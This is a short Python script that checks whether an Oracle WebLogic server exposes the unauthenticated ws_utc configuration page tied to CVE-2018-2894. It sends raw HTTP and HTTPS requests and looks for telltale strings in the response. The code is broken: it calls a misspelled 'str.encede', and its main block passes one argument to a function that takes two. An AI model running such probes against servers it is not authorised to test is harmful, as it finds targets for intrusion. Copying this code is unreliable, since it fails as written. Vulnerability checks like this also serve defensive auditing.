#coding:utf-8
#!/usr/bin/env 
#CVE-2018-2894[ws_utc]

import socket
import ssl

payload = '''ws_utc/resources/setting/options/general'''
socket.setdefaulttimeout(1) 

def check(ip,port):
    try:
        client1 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #基于http
        client1.connect((ip,int(port)))
        client1.sendall(str.encede('''GET /{} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(payload,ip,port)))

        buf1 = ""
        buf = "1"
        while len(buf):
            try:
                #print buf
                buf1 = buf1 + str(buf)
                buf = client1.recv(1024)
            except socket.error as e:
                break
        client1.close()
        if "BasicConfigOptions.workDir" in buf1 or "Deploying Application" in buf1:
            return ip,port
        
    except socket.error as e:
        pass
    
    try:
        client2 = ssl.wrap_socket(socket.socket())
        client2.connect((ip,int(port)))
        client2.sendall(str.encede('''GET /{} HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0\r\n\r\n'''.format(payload,ip,port)))

        buf1 = ""
        buf = "1"
        while len(buf):
            try:
                buf1 = buf1 + str(buf)
                buf = client2.recv(1024)
            except socket.error as e:
                break
        client2.close()  
        if "BasicConfigOptions.workDir" in buf1 or "Deploying Application" in buf1:
            return ip,port
        
    except socket.error as e:
        pass
       
if __name__=='__main__':
    print (check('192.168.211.131'))

